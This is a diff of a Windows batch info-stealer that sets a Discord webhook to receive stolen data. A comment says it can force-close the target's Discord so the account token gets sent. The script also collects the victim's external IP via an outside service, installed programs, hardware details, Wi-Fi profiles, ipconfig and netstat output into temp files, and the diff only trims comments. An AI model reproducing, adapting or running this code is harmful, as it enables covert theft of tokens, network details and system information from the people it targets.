@@ -24,15 +24,12 @@ set webhook=https://discord.com/api/webhooks/945632689044725790/B4oEpd70mN-ZL8V9
 ::set 1 if you want that the discord of your target get closed ( discord needs to be restarted to send you the token)
 set /a killdc = 0
 
-::get ip
 curl -o %userprofile%\AppData\Local\Temp\ipp.txt https://myexternalip.com/raw
 set /p ip=<%userprofile%\AppData\Local\Temp\ipp.txt
 
-::gets a list of all installed programms
 powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table >%userprofile%\AppData\Local\Temp\programms.txt "
 
 
-::gets informations about the pc
 echo Hard Drive Space:>%userprofile%\AppData\Local\Temp\System_INFO.txt
 wmic diskdrive get size>>%userprofile%\AppData\Local\Temp\System_INFO.txt
 echo Service Tag:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
@@ -48,7 +45,7 @@ for /F "tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
 
 :aftertesti
 
-::gets the ipconfig (also local ip)
+::gets the ipconfig
 ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt
 
 ::gets the info about the netstat
